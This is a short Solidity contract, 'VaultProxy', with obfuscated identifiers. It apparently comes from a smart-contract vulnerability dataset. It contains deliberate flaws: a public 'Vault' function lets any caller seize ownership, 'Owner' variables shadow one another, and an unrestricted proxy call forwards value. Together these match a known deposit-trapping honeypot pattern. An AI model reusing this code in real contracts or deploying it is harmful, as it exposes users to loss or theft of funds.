pragma solidity ^0.4.23;

contract Proxy  {
    modifier _0x01f92e { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function _0x9ffdba(address _0xf13cbd) public _0x01f92e { Owner = _0xf13cbd; }
    function _0x012e78(address _0x91d027, bytes data) public payable {
        _0x91d027.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            _0x098914();
        }
    }

    function _0x098914() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function _0x81a083(uint256 _0xa8cf21) public _0x01f92e {
        if (_0xa8cf21>0 && Deposits[msg.sender]>=_0xa8cf21) {
            msg.sender.transfer(_0xa8cf21);
        }
    }
}